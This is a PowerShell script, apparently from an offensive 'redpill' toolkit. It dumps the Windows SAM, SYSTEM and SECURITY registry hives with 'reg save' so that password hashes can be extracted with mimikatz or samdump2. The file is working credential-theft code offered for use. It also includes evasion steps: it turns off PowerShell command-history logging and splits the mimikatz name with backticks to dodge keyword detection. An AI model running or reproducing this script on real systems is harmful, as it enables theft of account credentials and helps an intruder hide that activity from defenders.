<#
.SYNOPSIS
   Dump SAM, SYSTEM, SECURITY metadata

   Author: @r00t-3xp10it
   Mitre : T1003 (lolbas)
   Tested Under: Windows 10 (19043) x64 bits
   Required Dependencies: Administrator privs
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.8

.DESCRIPTION
   Dump SAM, SYSTEM, SECURITY metadata to %tmp% dir
   and use mimi`ka`tz or samdump2 to decode metadata

.Parameter Storage
   Where to store dump files (default: $Env:TMP)

.EXAMPLE
   PS C:\> Get-Help .\DumpLsass.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\DumpLsass.ps1 -Storage "$Env:TMP"
   Dump sam\system\security data to %tmp% directory

.INPUTS
   None. You cannot pipe objects into DumpLsass.ps1

.OUTPUTS
   auth token
   ----------
   ADMINISTRATOR

   * Administrator privileges ..
     => Dumping sam, system, security data to: 'C:\Users\pedro\AppData\Local\Temp'
   * Done - TimeLapse: 22:06:24 - Decode with mimikatz\samdump2 ..
   
.LINK
   https://github.com/r00t-3xp10it/redpill
   https://lolbas-project.github.io/lolbas/Libraries/Comsvcs/
#>


#CmdLet Global variable declarations!
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Storage="$Env:TMP"
)


Write-Host ""
$Working_dir = (Get-Location).Path
$ErrorActionPreference = "SilentlyContinue"
#Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$RandomMe = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {[char]$_})
$IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")


#Check cmdlet privileges
If($IsClientAdmin -iMatch 'False')
{
   Write-Host "x " -ForegroundColor Red -NoNewline;
   Write-Host "Administrator privileges required!" -ForegroundColor DarkGray
   exit #Exit @DumpLsass cmdlet
}
Else
{
   Write-Host "  auth token" -ForegroundColor Green
   Write-Host "  ----------"
   Write-Host "  ADMINISTRATOR`n"
   Start-Sleep -Milliseconds 700
   Write-Host "* Administrator privileges .." -ForegroundColor Green;
}


cd $Storage


   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Dump SAM, SYSTEM, SECURITY registry hive(s) data!
   #>

   #Delete old dumps left behind by previous executions.
   If(Test-Path -Path "sam" -EA SilentlyContinue){Remove-Item -Path "$Storage\sam" -Force}
   If(Test-Path -Path "system" -EA SilentlyContinue){Remove-Item -Path "$Storage\system" -Force}
   If(Test-Path -Path "security" -EA SilentlyContinue){Remove-Item -Path "$Storage\security" -Force}

   #Use cmd to dump related files
   cmd /R reg save hklm\sam sam|Out-Null
   cmd /R reg save hklm\system system|Out-Null
   cmd /R reg save hklm\security security|Out-Null
   Write-Host "  => Dumping sam, system, security data to: '" -NoNewline
   Write-Host "$Storage" -ForegroundColor Yellow -NoNewline
   Write-Host "'"



cd $Working_dir
Start-Sleep -Milliseconds 600
#Clean all artifacts left behind.
$DoneDate = Get-Date -Format "HH:mm:ss"
Write-Host "* Done - TimeLapse: " -ForegroundColor Green -NoNewline
Write-Host "$DoneDate" -ForegroundColor Yellow -NoNewline 
Write-Host " - Decode with mim`ikatz\samdump2 ..`n" -ForegroundColor Green 
exit